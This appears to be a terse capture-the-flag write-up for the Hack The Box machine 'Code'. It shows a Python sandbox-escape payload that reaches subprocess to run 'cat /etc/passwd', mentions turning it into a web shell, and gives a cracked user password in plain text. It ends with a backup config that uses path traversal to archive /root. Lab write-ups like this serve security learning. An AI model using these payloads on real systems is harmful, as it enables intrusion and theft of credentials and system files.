## Code htb machine (easy)

code also vulneable to ssti ```val = f"{7*7}"```


found this initial payload

```bash
p = ().__class__.__bases__[0].__subclasses__()[317]

payload = "cat /etc/passwd"
proc = p(["sh", "-c", payload], stdout=-1, stderr=-1, stdin=-1)
out, _ = proc.communicate()

#print(out)

if out:
    print(out.decode())
```
With this payload, i wreated a web shell and executed it i got the user flag

found database file, and cracked the user martin

nafeelswordsmaster


```json
{
  "destination": "/tmp/backups",
  "multiprocessing": true,
  "verbose_log": false,
  "directories_to_archive": [
    "/home/....//....//root"
  ]
}
```